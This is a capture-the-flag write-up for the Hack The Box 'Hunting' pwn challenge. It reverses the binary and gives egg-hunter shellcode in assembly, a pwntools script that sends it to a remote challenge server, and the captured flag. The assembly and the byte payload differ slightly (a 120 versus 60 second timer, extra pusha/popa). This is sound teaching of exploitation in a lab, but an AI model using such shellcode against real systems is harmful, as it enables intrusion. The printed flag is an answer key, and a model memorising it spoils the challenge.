---
author: "lilith"
title: "HTB Hunting Writeup"
date: "2022-12-05"
description: "Hunting in the lower realms"
tags:
  - writeup
  - pwn
---

![](images/htb-hunting/description.png)

### Analyzing the binary

![](images/htb-hunting/analyze.png)
The binary haults for the input and crashes as we pass something.
![](images/htb-hunting/strings-output.png)
Upon reading the stings we found a string which looks like a dummy file. Time to look for it in IDA pro.

### IDA
> i changed some of the variable names for better understanding

I jumped to the variable to see where it was being used and after reading the code we see that that string was being moved from one location to another.
![](images/htb-hunting/img1.png)
It first sets a new location and copies the flag to that location then empty's flag value from the previous location.
![](images/htb-hunting/img2.png)
It also creates an exit signal and triggers it with a timer of 10 seconds. Which means that program will exit after 10 seconds.
![](images/htb-hunting/img3.png)
> I am literally reversing it from down to top

Before the singnal code, it calls a function which returns a randomly generated number.
![](images/htb-hunting/img4.png)
Further reading the code we now know that it generates a number from a range of `0x5FFFFFFF` < i <= `0xF7000000`
which is a randomly generated address.
Then it takes to a buffer size of `60` and executes it as a shellcode. (reason why the segfault)

So overall the program moves the flag to a random address location, kills the program after 10 seconds, reads our input and executes it as a shellcode.

> NOTE: Since the buffer size is limited. We have to be very creative and minimal while crafting our payload.

### Planning our exploit

Since the program kills itself after 10 seconds we will set up a timer with much higher value. Then we will traverse through addresses from a range of `0x5FFFFFFF`searching for the flag and send it to stdout if it matches.

```asm
section .text

global _start

_start:
  ; Set a timer to send a SIGALRM signal after 120 seconds.
  push 120
  pop ebx
  mov al, 0x1b
  int 0x80

  ; Set the starting address for the search.
  mov edi, 0x7b425448 ; "{BTH"
  mov edx, 0x5fffffff

next_page:
  ; Set the last byte address on the page.
  or dx, 0xfff

  ; Move to the next page.
  add edx, 4096

next_address:
  ; Move to the next address on the page.
  inc edx

  ; Check if the current address is valid.
  push edx
  xor ecx, ecx
  mov al, 0x21
  int 0x80
  pop edx

  ; If the address is not valid, go to the next page.
  cmp al, 0xf2
  jz next_page

  ; Check if the value at the current address is the flag.
  cmp dword [edx], edi

  ; If the value matches, then stdout
  jnz next_address
  mov ecx, edx
  push 36
  pop edx
  push 1
  pop ebx
  mov al, 0x4
  int 0x80

  ; Exit the program.
  xor eax, eax
  ret
```

### Pwn Time

First we craft our payload into bytecodes and send it through pwntools
![](images/htb-hunting/img7.png)

```py
from pwn import *

payload = b"\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80"

#r = process("./hunting")
r = remote("134.209.22.121", 31067)
r.send(payload)

f = r.recv()
print(f)

r.close()
```
![](images/htb-hunting/img8.png)

Flag: `HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}`